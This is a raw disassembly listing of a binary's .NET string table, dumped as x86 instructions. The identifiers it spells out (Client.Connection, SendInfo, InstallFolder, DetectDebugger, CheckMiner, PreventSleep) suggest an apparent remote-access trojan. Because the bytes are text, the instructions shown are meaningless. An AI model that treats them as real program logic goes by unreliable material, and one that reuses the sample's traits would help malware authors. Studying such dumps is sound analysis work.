  4085ac:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4085b3:	00 53 79             	add    %dl,0x79(%ebx)
  4085b6:	73 74                	jae    0x40862c
  4085b8:	65 6d                	gs insl (%dx),%es:(%edi)
  4085ba:	2e 53                	cs push %ebx
  4085bc:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4085c0:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4085c7:	68 
  4085c8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085ca:	74 69                	je     0x408635
  4085cc:	63 61 74             	arpl   %esp,0x74(%ecx)
  4085cf:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4085d6:	74 65                	je     0x40863d
  4085d8:	6d                   	insl   (%dx),%es:(%edi)
  4085d9:	2e 52                	cs push %edx
  4085db:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4085de:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4085e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e4:	00 58 35             	add    %bl,0x35(%eax)
  4085e7:	30 39                	xor    %bh,(%ecx)
  4085e9:	43                   	inc    %ebx
  4085ea:	65 72 74             	gs jb  0x408661
  4085ed:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4085f4:	43                   	inc    %ebx
  4085f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f6:	6c                   	insb   (%dx),%es:(%edi)
  4085f7:	6c                   	insb   (%dx),%es:(%edi)
  4085f8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4085fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4085fe:	00 4d 61             	add    %cl,0x61(%ebp)
  408601:	6e                   	outsb  %ds:(%esi),(%dx)
  408602:	61                   	popa
  408603:	67 65 6d             	gs insl (%dx),%es:(%di)
  408606:	65 6e                	outsb  %gs:(%esi),(%dx)
  408608:	74 4f                	je     0x408659
  40860a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40860d:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  408611:	6c                   	insb   (%dx),%es:(%edi)
  408612:	6c                   	insb   (%dx),%es:(%edi)
  408613:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408618:	6e                   	outsb  %ds:(%esi),(%dx)
  408619:	00 43 6c             	add    %al,0x6c(%ebx)
  40861c:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  408623:	6e                   	outsb  %ds:(%esi),(%dx)
  408624:	6e                   	outsb  %ds:(%esi),(%dx)
  408625:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40862a:	6e                   	outsb  %ds:(%esi),(%dx)
  40862b:	00 73 65             	add    %dh,0x65(%ebx)
  40862e:	74 5f                	je     0x40868f
  408630:	50                   	push   %eax
  408631:	6f                   	outsl  %ds:(%esi),(%dx)
  408632:	73 69                	jae    0x40869d
  408634:	74 69                	je     0x40869f
  408636:	6f                   	outsl  %ds:(%esi),(%dx)
  408637:	6e                   	outsb  %ds:(%esi),(%dx)
  408638:	00 70 6f             	add    %dh,0x6f(%eax)
  40863b:	73 69                	jae    0x4086a6
  40863d:	74 69                	je     0x4086a8
  40863f:	6f                   	outsl  %ds:(%esi),(%dx)
  408640:	6e                   	outsb  %ds:(%esi),(%dx)
  408641:	00 43 72             	add    %al,0x72(%ebx)
  408644:	79 70                	jns    0x4086b6
  408646:	74 6f                	je     0x4086b7
  408648:	67 72 61             	addr16 jb 0x4086ac
  40864b:	70 68                	jo     0x4086b5
  40864d:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408654:	74 69                	je     0x4086bf
  408656:	6f                   	outsl  %ds:(%esi),(%dx)
  408657:	6e                   	outsb  %ds:(%esi),(%dx)
  408658:	00 41 72             	add    %al,0x72(%ecx)
  40865b:	67 75 6d             	addr16 jne 0x4086cb
  40865e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408660:	74 4e                	je     0x4086b0
  408662:	75 6c                	jne    0x4086d0
  408664:	6c                   	insb   (%dx),%es:(%edi)
  408665:	45                   	inc    %ebp
  408666:	78 63                	js     0x4086cb
  408668:	65 70 74             	gs jo  0x4086df
  40866b:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408672:	75 6d                	jne    0x4086e1
  408674:	65 6e                	outsb  %gs:(%esi),(%dx)
  408676:	74 45                	je     0x4086bd
  408678:	78 63                	js     0x4086dd
  40867a:	65 70 74             	gs jo  0x4086f1
  40867d:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408684:	6e                   	outsb  %ds:(%esi),(%dx)
  408685:	6f                   	outsl  %ds:(%esi),(%dx)
  408686:	77 6e                	ja     0x4086f6
  408688:	00 49 6d             	add    %cl,0x6d(%ecx)
  40868b:	61                   	popa
  40868c:	67 65 43             	addr16 gs inc %ebx
  40868f:	6f                   	outsl  %ds:(%esi),(%dx)
  408690:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408695:	66 6f                	outsw  %ds:(%esi),(%dx)
  408697:	00 53 65             	add    %dl,0x65(%ebx)
  40869a:	6e                   	outsb  %ds:(%esi),(%dx)
  40869b:	64 49                	fs dec %ecx
  40869d:	6e                   	outsb  %ds:(%esi),(%dx)
  40869e:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086a0:	00 46 69             	add    %al,0x69(%esi)
  4086a3:	6c                   	insb   (%dx),%es:(%edi)
  4086a4:	65 49                	gs dec %ecx
  4086a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086a7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086a9:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4086ad:	76 65                	jbe    0x408714
  4086af:	49                   	dec    %ecx
  4086b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086b3:	00 46 69             	add    %al,0x69(%esi)
  4086b6:	6c                   	insb   (%dx),%es:(%edi)
  4086b7:	65 53                	gs push %ebx
  4086b9:	79 73                	jns    0x40872e
  4086bb:	74 65                	je     0x408722
  4086bd:	6d                   	insl   (%dx),%es:(%edi)
  4086be:	49                   	dec    %ecx
  4086bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086c2:	00 43 6f             	add    %al,0x6f(%ebx)
  4086c5:	6d                   	insl   (%dx),%es:(%edi)
  4086c6:	70 75                	jo     0x40873d
  4086c8:	74 65                	je     0x40872f
  4086ca:	72 49                	jb     0x408715
  4086cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4086cd:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086cf:	00 43 53             	add    %al,0x53(%ebx)
  4086d2:	68 61 72 70 41       	push   $0x41707261
  4086d7:	72 67                	jb     0x408740
  4086d9:	75 6d                	jne    0x408748
  4086db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086dd:	74 49                	je     0x408728
  4086df:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086e2:	00 73 65             	add    %dh,0x65(%ebx)
  4086e5:	74 5f                	je     0x408746
  4086e7:	53                   	push   %ebx
  4086e8:	74 61                	je     0x40874b
  4086ea:	72 74                	jb     0x408760
  4086ec:	49                   	dec    %ecx
  4086ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ee:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086f0:	00 50 72             	add    %dl,0x72(%eax)
  4086f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f4:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086f7:	73 53                	jae    0x40874c
  4086f9:	74 61                	je     0x40875c
  4086fb:	72 74                	jb     0x408771
  4086fd:	49                   	dec    %ecx
  4086fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ff:	66 6f                	outsw  %ds:(%esi),(%dx)
  408701:	00 57 72             	add    %dl,0x72(%edi)
  408704:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  40870b:	50 
  40870c:	72 65                	jb     0x408773
  40870e:	76 65                	jbe    0x408775
  408710:	6e                   	outsb  %ds:(%esi),(%dx)
  408711:	74 53                	je     0x408766
  408713:	6c                   	insb   (%dx),%es:(%edi)
  408714:	65 65 70 00          	gs gs jo 0x408718
  408718:	5a                   	pop    %edx
  408719:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408720:	65 6e                	outsb  %gs:(%esi),(%dx)
  408722:	74 41                	je     0x408765
  408724:	70 70                	jo     0x408796
  408726:	00 4d 69             	add    %cl,0x69(%ebp)
  408729:	63 72 6f             	arpl   %esi,0x6f(%edx)
  40872c:	73 6f                	jae    0x40879d
  40872e:	66 74 2e             	data16 je 0x40875f
  408731:	43                   	inc    %ebx
  408732:	53                   	push   %ebx
  408733:	68 61 72 70 00       	push   $0x707261
  408738:	4e                   	dec    %esi
  408739:	6f                   	outsl  %ds:(%esi),(%dx)
  40873a:	72 6d                	jb     0x4087a9
  40873c:	61                   	popa
  40873d:	6c                   	insb   (%dx),%es:(%edi)
  40873e:	53                   	push   %ebx
  40873f:	74 61                	je     0x4087a2
  408741:	72 74                	jb     0x4087b7
  408743:	75 70                	jne    0x4087b5
  408745:	00 53 79             	add    %dl,0x79(%ebx)
  408748:	73 74                	jae    0x4087be
  40874a:	65 6d                	gs insl (%dx),%es:(%edi)
  40874c:	2e 4c                	cs dec %esp
  40874e:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408755:	61                   	popa
  408756:	72 00                	jb     0x408758
  408758:	43                   	inc    %ebx
  408759:	68 61 72 00 49       	push   $0x49007261
  40875e:	6e                   	outsb  %ds:(%esi),(%dx)
  40875f:	76 6f                	jbe    0x4087d0
  408761:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408765:	6d                   	insl   (%dx),%es:(%edi)
  408766:	62 65 72             	bound  %esp,0x72(%ebp)
  408769:	00 4d 44             	add    %cl,0x44(%ebp)
  40876c:	35 43 72 79 70       	xor    $0x70797243,%eax
  408771:	74 6f                	je     0x4087e2
  408773:	53                   	push   %ebx
  408774:	65 72 76             	gs jb  0x4087ed
  408777:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40877e:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408785:	41 
  408786:	43                   	inc    %ebx
  408787:	72 79                	jb     0x408802
  408789:	70 74                	jo     0x4087ff
  40878b:	6f                   	outsl  %ds:(%esi),(%dx)
  40878c:	53                   	push   %ebx
  40878d:	65 72 76             	gs jb  0x408806
  408790:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408797:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  40879e:	73 
  40879f:	43                   	inc    %ebx
  4087a0:	72 79                	jb     0x40881b
  4087a2:	70 74                	jo     0x408818
  4087a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a5:	53                   	push   %ebx
  4087a6:	65 72 76             	gs jb  0x40881f
  4087a9:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4087b0:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4087b7:	72 
  4087b8:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4087bf:	64 65 72 00          	fs gs jb 0x4087c3
  4087c3:	49                   	dec    %ecx
  4087c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c5:	73 74                	jae    0x40883b
  4087c7:	61                   	popa
  4087c8:	6c                   	insb   (%dx),%es:(%edi)
  4087c9:	6c                   	insb   (%dx),%es:(%edi)
  4087ca:	46                   	inc    %esi
  4087cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4087cc:	6c                   	insb   (%dx),%es:(%edi)
  4087cd:	64 65 72 00          	fs gs jb 0x4087d1
  4087d1:	49                   	dec    %ecx
  4087d2:	64 53                	fs push %ebx
  4087d4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4087d6:	64 65 72 00          	fs gs jb 0x4087da
  4087da:	73 65                	jae    0x408841
  4087dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4087dd:	64 65 72 00          	fs gs jb 0x4087e1
  4087e1:	4d                   	dec    %ebp
  4087e2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4087e9:	74 2e                	je     0x408819
  4087eb:	43                   	inc    %ebx
  4087ec:	53                   	push   %ebx
  4087ed:	68 61 72 70 2e       	push   $0x2e707261
  4087f2:	52                   	push   %edx
  4087f3:	75 6e                	jne    0x408863
  4087f5:	74 69                	je     0x408860
  4087f7:	6d                   	insl   (%dx),%es:(%edi)
  4087f8:	65 42                	gs inc %edx
  4087fa:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408801:	61                   	popa
  408802:	6c                   	insb   (%dx),%es:(%edi)
  408803:	6c                   	insb   (%dx),%es:(%edi)
  408804:	53                   	push   %ebx
  408805:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  40880c:	65 
  40880d:	72 00                	jb     0x40880f
  40880f:	47                   	inc    %edi
  408810:	65 74 45             	gs je  0x408858
  408813:	6e                   	outsb  %ds:(%esi),(%dx)
  408814:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408817:	65 72 00             	gs jb  0x40881a
  40881a:	67 65 74 5f          	addr16 gs je 0x40887d
  40881e:	42                   	inc    %edx
  40881f:	75 66                	jne    0x408887
  408821:	66 65 72 00          	data16 gs jb 0x408825
  408825:	73 65                	jae    0x40888c
  408827:	74 5f                	je     0x408888
  408829:	42                   	inc    %edx
  40882a:	75 66                	jne    0x408892
  40882c:	66 65 72 00          	data16 gs jb 0x408830
  408830:	57                   	push   %edi
  408831:	72 69                	jb     0x40889c
  408833:	74 65                	je     0x40889a
  408835:	49                   	dec    %ecx
  408836:	6e                   	outsb  %ds:(%esi),(%dx)
  408837:	74 65                	je     0x40889e
  408839:	67 65 72 00          	addr16 gs jb 0x40883d
  40883d:	67 65 74 5f          	addr16 gs je 0x4088a0
  408841:	41                   	inc    %ecx
  408842:	73 49                	jae    0x40888d
  408844:	6e                   	outsb  %ds:(%esi),(%dx)
  408845:	74 65                	je     0x4088ac
  408847:	67 65 72 00          	addr16 gs jb 0x40884b
  40884b:	73 65                	jae    0x4088b2
  40884d:	74 5f                	je     0x4088ae
  40884f:	41                   	inc    %ecx
  408850:	73 49                	jae    0x40889b
  408852:	6e                   	outsb  %ds:(%esi),(%dx)
  408853:	74 65                	je     0x4088ba
  408855:	67 65 72 00          	addr16 gs jb 0x408859
  408859:	47                   	inc    %edi
  40885a:	65 74 41             	gs je  0x40889e
  40885d:	73 49                	jae    0x4088a8
  40885f:	6e                   	outsb  %ds:(%esi),(%dx)
  408860:	74 65                	je     0x4088c7
  408862:	67 65 72 00          	addr16 gs jb 0x408866
  408866:	53                   	push   %ebx
  408867:	65 74 41             	gs je  0x4088ab
  40886a:	73 49                	jae    0x4088b5
  40886c:	6e                   	outsb  %ds:(%esi),(%dx)
  40886d:	74 65                	je     0x4088d4
  40886f:	67 65 72 00          	addr16 gs jb 0x408873
  408873:	44                   	inc    %esp
  408874:	65 74 65             	gs je  0x4088dc
  408877:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  40887b:	62 75 67             	bound  %esi,0x67(%ebp)
  40887e:	67 65 72 00          	addr16 gs jb 0x408882
  408882:	4d                   	dec    %ebp
  408883:	61                   	popa
  408884:	6e                   	outsb  %ds:(%esi),(%dx)
  408885:	61                   	popa
  408886:	67 65 6d             	gs insl (%dx),%es:(%di)
  408889:	65 6e                	outsb  %gs:(%esi),(%dx)
  40888b:	74 4f                	je     0x4088dc
  40888d:	62 6a 65             	bound  %ebp,0x65(%edx)
  408890:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408894:	61                   	popa
  408895:	72 63                	jb     0x4088fa
  408897:	68 65 72 00 53       	push   $0x53007265
  40889c:	65 73 73             	gs jae 0x408912
  40889f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4088a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a7:	67 45                	addr16 inc %ebp
  4088a9:	76 65                	jbe    0x408910
  4088ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ac:	74 48                	je     0x4088f6
  4088ae:	61                   	popa
  4088af:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b0:	64 6c                	fs insb (%dx),%es:(%edi)
  4088b2:	65 72 00             	gs jb  0x4088b5
  4088b5:	54                   	push   %esp
  4088b6:	69 6d 65 72 00 43 68 	imul   $0x68430072,0x65(%ebp),%ebp
  4088bd:	65 63 6b 4d          	arpl   %ebp,%gs:0x4d(%ebx)
  4088c1:	69 6e 65 72 00 6f 77 	imul   $0x776f0072,0x65(%esi),%ebp
  4088c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c9:	65 72 00             	gs jb  0x4088cc
  4088cc:	43                   	inc    %ebx
  4088cd:	6c                   	insb   (%dx),%es:(%edi)
  4088ce:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  4088d5:	6c                   	insb   (%dx),%es:(%edi)
  4088d6:	70 65                	jo     0x40893d
  4088d8:	72 00                	jb     0x4088da
  4088da:	54                   	push   %esp
  4088db:	6f                   	outsl  %ds:(%esi),(%dx)
  4088dc:	55                   	push   %ebp
  4088dd:	70 70                	jo     0x40894f
  4088df:	65 72 00             	gs jb  0x4088e2
  4088e2:	44                   	inc    %esp
  4088e3:	65 74 65             	gs je  0x40894b
  4088e6:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  4088ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4088eb:	75 66                	jne    0x408953
  4088ed:	61                   	popa
  4088ee:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  4088f2:	65 72 00             	gs jb  0x4088f5
  4088f5:	43                   	inc    %ebx
  4088f6:	75 72                	jne    0x40896a
  4088f8:	72 65                	jb     0x40895f
  4088fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4088fb:	74 55                	je     0x408952
  4088fd:	73 65                	jae    0x408964
  4088ff:	72 00                	jb     0x408901
  408901:	53                   	push   %ebx
  408902:	74 72                	je     0x408976
  408904:	65 61                	gs popa
  408906:	6d                   	insl   (%dx),%es:(%edi)
  408907:	57                   	push   %edi
  408908:	72 69                	jb     0x408973
  40890a:	74 65                	je     0x408971
  40890c:	72 00                	jb     0x40890e
  40890e:	54                   	push   %esp
  40890f:	65 78 74             	gs js  0x408986
  408912:	57                   	push   %edi
  408913:	72 69                	jb     0x40897e
  408915:	74 65                	je     0x40897c
  408917:	72 00                	jb     0x408919
  408919:	45                   	inc    %ebp
  40891a:	6e                   	outsb  %ds:(%esi),(%dx)
  40891b:	74 65                	je     0x408982
  40891d:	72 00                	jb     0x40891f
  40891f:	42                   	inc    %edx
  408920:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408927:	72 
  408928:	74 65                	je     0x40898f
  40892a:	72 00                	jb     0x40892c
  40892c:	54                   	push   %esp
  40892d:	6f                   	outsl  %ds:(%esi),(%dx)
  40892e:	4c                   	dec    %esp
  40892f:	6f                   	outsl  %ds:(%esi),(%dx)
  408930:	77 65                	ja     0x408997
  408932:	72 00                	jb     0x408934
  408934:	45                   	inc    %ebp
  408935:	72 72                	jb     0x4089a9
  408937:	6f                   	outsl  %ds:(%esi),(%dx)
  408938:	72 00                	jb     0x40893a
  40893a:	49                   	dec    %ecx
  40893b:	45                   	inc    %ebp
  40893c:	6e                   	outsb  %ds:(%esi),(%dx)
  40893d:	75 6d                	jne    0x4089ac
  40893f:	65 72 61             	gs jb  0x4089a3
  408942:	74 6f                	je     0x4089b3
  408944:	72 00                	jb     0x408946
  408946:	4d                   	dec    %ebp
  408947:	61                   	popa
  408948:	6e                   	outsb  %ds:(%esi),(%dx)
  408949:	61                   	popa
  40894a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40894d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40894f:	74 4f                	je     0x4089a0
  408951:	62 6a 65             	bound  %ebp,0x65(%edx)
  408954:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408958:	75 6d                	jne    0x4089c7
  40895a:	65 72 61             	gs jb  0x4089be
  40895d:	74 6f                	je     0x4089ce
  40895f:	72 00                	jb     0x408961
  408961:	53                   	push   %ebx
  408962:	79 73                	jns    0x4089d7
  408964:	74 65                	je     0x4089cb
  408966:	6d                   	insl   (%dx),%es:(%edi)
  408967:	2e 43                	cs inc %ebx
  408969:	6f                   	outsl  %ds:(%esi),(%dx)
  40896a:	6c                   	insb   (%dx),%es:(%edi)
  40896b:	6c                   	insb   (%dx),%es:(%edi)
  40896c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408971:	6e                   	outsb  %ds:(%esi),(%dx)
  408972:	73 2e                	jae    0x4089a2
  408974:	49                   	dec    %ecx
  408975:	45                   	inc    %ebp
  408976:	6e                   	outsb  %ds:(%esi),(%dx)
  408977:	75 6d                	jne    0x4089e6
  408979:	65 72 61             	gs jb  0x4089dd
  40897c:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408980:	47                   	inc    %edi
  408981:	65 74 45             	gs je  0x4089c9
  408984:	6e                   	outsb  %ds:(%esi),(%dx)
  408985:	75 6d                	jne    0x4089f4
  408987:	65 72 61             	gs jb  0x4089eb
  40898a:	74 6f                	je     0x4089fb
  40898c:	72 00                	jb     0x40898e
  40898e:	41                   	inc    %ecx
  40898f:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408993:	61                   	popa
  408994:	74 6f                	je     0x408a05
  408996:	72 00                	jb     0x408998
  408998:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40899d:	00 2e                	add    %ch,(%esi)
  40899f:	63 63 74             	arpl   %esp,0x74(%ebx)
  4089a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a3:	72 00                	jb     0x4089a5
  4089a5:	4d                   	dec    %ebp
  4089a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a8:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  4089af:	65 
  4089b0:	61                   	popa
  4089b1:	74 65                	je     0x408a18
  4089b3:	44                   	inc    %esp
  4089b4:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4089b8:	70 74                	jo     0x408a2e
  4089ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bb:	72 00                	jb     0x4089bd
  4089bd:	43                   	inc    %ebx
  4089be:	72 65                	jb     0x408a25
  4089c0:	61                   	popa
  4089c1:	74 65                	je     0x408a28
  4089c3:	45                   	inc    %ebp
  4089c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c5:	63 72 79             	arpl   %esi,0x79(%edx)
  4089c8:	70 74                	jo     0x408a3e
  4089ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cb:	72 00                	jb     0x4089cd
  4089cd:	49                   	dec    %ecx
  4089ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cf:	74 50                	je     0x408a21
  4089d1:	74 72                	je     0x408a45
  4089d3:	00 53 79             	add    %dl,0x79(%ebx)
  4089d6:	73 74                	jae    0x408a4c
  4089d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4089da:	2e 44                	cs inc %esp
  4089dc:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4089e3:	69 63 73 00 4d 65 74 	imul   $0x74654d00,0x73(%ebx),%esp
  4089ea:	68 6f 64 73 00       	push   $0x73646f
  4089ef:	4d                   	dec    %ebp
  4089f0:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4089f7:	74 2e                	je     0x408a27
  4089f9:	56                   	push   %esi
  4089fa:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408a01:	73 69                	jae    0x408a6c
  408a03:	63 2e                	arpl   %ebp,(%esi)
  408a05:	44                   	inc    %esp
  408a06:	65 76 69             	gs jbe 0x408a72
  408a09:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a0c:	00 53 79             	add    %dl,0x79(%ebx)
  408a0f:	73 74                	jae    0x408a85
  408a11:	65 6d                	gs insl (%dx),%es:(%edi)
  408a13:	2e 52                	cs push %edx
  408a15:	75 6e                	jne    0x408a85
  408a17:	74 69                	je     0x408a82
  408a19:	6d                   	insl   (%dx),%es:(%edi)
  408a1a:	65 2e 49             	gs cs dec %ecx
  408a1d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1e:	74 65                	je     0x408a85
  408a20:	72 6f                	jb     0x408a91
  408a22:	70 53                	jo     0x408a77
  408a24:	65 72 76             	gs jb  0x408a9d
  408a27:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408a2e:	73 74                	jae    0x408aa4
  408a30:	65 6d                	gs insl (%dx),%es:(%edi)
  408a32:	2e 52                	cs push %edx
  408a34:	75 6e                	jne    0x408aa4
  408a36:	74 69                	je     0x408aa1
  408a38:	6d                   	insl   (%dx),%es:(%edi)
  408a39:	65 2e 43             	gs cs inc %ebx
  408a3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a3d:	6d                   	insl   (%dx),%es:(%edi)
  408a3e:	70 69                	jo     0x408aa9
  408a40:	6c                   	insb   (%dx),%es:(%edi)
  408a41:	65 72 53             	gs jb  0x408a97
  408a44:	65 72 76             	gs jb  0x408abd
  408a47:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408a4e:	62 75 67             	bound  %esi,0x67(%ebp)
  408a51:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408a58:	65 
  408a59:	73 00                	jae    0x408a5b
  408a5b:	45                   	inc    %ebp
  408a5c:	78 70                	js     0x408ace
  408a5e:	61                   	popa
  408a5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a60:	64 45                	fs inc %ebp
  408a62:	6e                   	outsb  %ds:(%esi),(%dx)
  408a63:	76 69                	jbe    0x408ace
  408a65:	72 6f                	jb     0x408ad6
  408a67:	6e                   	outsb  %ds:(%esi),(%dx)
  408a68:	6d                   	insl   (%dx),%es:(%edi)
  408a69:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a6b:	74 56                	je     0x408ac3
  408a6d:	61                   	popa
  408a6e:	72 69                	jb     0x408ad9
  408a70:	61                   	popa
  408a71:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408a75:	00 47 65             	add    %al,0x65(%edi)
  408a78:	74 50                	je     0x408aca
  408a7a:	72 6f                	jb     0x408aeb
  408a7c:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a7f:	73 65                	jae    0x408ae6
  408a81:	73 00                	jae    0x408a83
  408a83:	47                   	inc    %edi
  408a84:	65 74 48             	gs je  0x408acf
  408a87:	6f                   	outsl  %ds:(%esi),(%dx)
  408a88:	73 74                	jae    0x408afe
  408a8a:	41                   	inc    %ecx
  408a8b:	64 64 72 65          	fs fs jb 0x408af4
  408a8f:	73 73                	jae    0x408b04
  408a91:	65 73 00             	gs jae 0x408a94
  408a94:	53                   	push   %ebx
  408a95:	79 73                	jns    0x408b0a
  408a97:	74 65                	je     0x408afe
  408a99:	6d                   	insl   (%dx),%es:(%edi)
  408a9a:	2e 53                	cs push %ebx
  408a9c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408aa0:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408aa7:	70 
  408aa8:	74 6f                	je     0x408b19
  408aaa:	67 72 61             	addr16 jb 0x408b0e
  408aad:	70 68                	jo     0x408b17
  408aaf:	79 2e                	jns    0x408adf
  408ab1:	58                   	pop    %eax
  408ab2:	35 30 39 43 65       	xor    $0x65433930,%eax
  408ab7:	72 74                	jb     0x408b2d
  408ab9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408ac0:	73 00                	jae    0x408ac2
  408ac2:	45                   	inc    %ebp
  408ac3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ac4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408ac7:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408acb:	74 65                	je     0x408b32
  408acd:	73 00                	jae    0x408acf
  408acf:	47                   	inc    %edi
  408ad0:	65 74 55             	gs je  0x408b28
  408ad3:	74 66                	je     0x408b3b
  408ad5:	38 42 79             	cmp    %al,0x79(%edx)
  408ad8:	74 65                	je     0x408b3f
  408ada:	73 00                	jae    0x408adc
  408adc:	75 74                	jne    0x408b52
  408ade:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408ae2:	74 65                	je     0x408b49
  408ae4:	73 00                	jae    0x408ae6
  408ae6:	52                   	push   %edx
